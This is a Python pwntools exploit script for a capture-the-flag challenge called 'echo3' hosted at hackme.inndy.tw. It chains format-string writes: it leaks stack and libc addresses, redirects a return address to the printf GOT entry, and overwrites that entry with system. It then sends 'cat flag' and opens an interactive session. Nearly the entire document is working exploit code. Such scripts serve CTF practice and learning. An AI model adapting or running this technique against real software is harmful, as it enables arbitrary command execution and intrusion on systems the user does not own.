#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo3")
if sys.argv[1] == "l":
    #  context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo3")
    #  io = gdb.debug("./echo3", gdbscript = '''
            #  b *0x8048774
            #  b *0x8048646
            #  c
            #  set $eax=0x20
            #  c
            #  c
            #  c
            #  ''')
    libc = elf.libc

else:
    io = remote("hackme.inndy.tw", 7720)
    libc = ELF("./libc-2.23.so.i386")

if __name__ == "__main__":
    '''
    inndy_echo3 [master●●] python rand.py
    0x20	4096    <- pick this random number
    0x1010	2048
    0x1050	2048
    0x1030	4096
    0x2010	2048
    0x30	4096
    0x50	2048
    0x40	4096
    0x3050	2047
    0x3010	2048
    0x2020	4096
    0x1040	4096
    0x1020	4096
    0x3020	4096
    0x10	2048
    0x2040	4096
    0x3030	4096
    0x3040	4096
    0x2050	2048
    0x2030	4096
    '''
    info("1st: leak addr")
    #  io.sendline("%29$p..%30$p..%43$p..flag0\0")
    io.sendline("%29$p..%30$p..%43$p..\0")
    #  io.recvuntil("0x")
    stack1d = int(io.recvuntil("..", drop = True), 16)
    success("stack1d -> {:#x}".format(stack1d))
    ret13 = stack1d - 0x108
    success("ret13 -> {:#x}".format(ret13))
    stack1e = int(io.recvuntil("..", drop = True), 16)
    success("stack1e -> {:#x}".format(stack1e))
    ret17 = stack1e - 0x100
    success("ret17 -> {:#x}".format(ret17))
    libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main']
    libc.address = libc.address - 246 if sys.argv[1] == 'l' else libc.address - 247
    if libc.address & 0xfff != 0:
        io.close()
        print "Fail!"
        exit(0)
    success("libc.address -> {:#x}".format(libc.address))
    #  pause()

    info("2nd: overwrite stack to ret")
    payload = "%{}c%{}$hn".format(ret13 & 0xffff, 0x1d)
    #  payload += "%{}c%{}$hn".format((ret17 & 0xffff) - (ret13 & 0xffff), 0x1e)
    payload += "%{}c%{}$hn".format(16, 0x1e)
    #  payload += "flag1"
    sleep(0.01)
    #  io.sendlineafter("flag0", payload + '\0')
    io.sendline(payload)
    #  pause()

    info("3rd: overwrite ret to got")
    payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x55)
    #  payload += "%{}c%hn".format(((elf.got['printf'] + 2) & 0xffff) - (elf.got['printf'] & 0xffff), 0x57)
    payload += "%{}c%{}$hn".format(2, 0x57)
    #  payload += "flag2"
    sleep(0.01)
    #  io.sendlineafter("flag1", payload + '\0')
    io.sendline(payload)
    #  pause()

    info("4th: overwrite got")
    payload = "%{}c%{}$hhn".format(libc.sym['system'] >> 16 & 0xff, 0x17)
    payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x13)
    #  payload += "flag3"
    sleep(0.01)
    #  io.sendlineafter("flag2", payload + '\0')
    io.sendline(payload)
    #  pause()

    info("5th: triger system('/bin/sh\0')")
    sleep(0.01)
    #  context.log_level = "debug"
    #  io.sendlineafter("flag3", "/bin/sh\0")
    #  io.sendline("/bin/sh\0")
    io.sendline("cat flag\0;")
    io.sendline("\n")
     
    io.interactive()
    io.close()
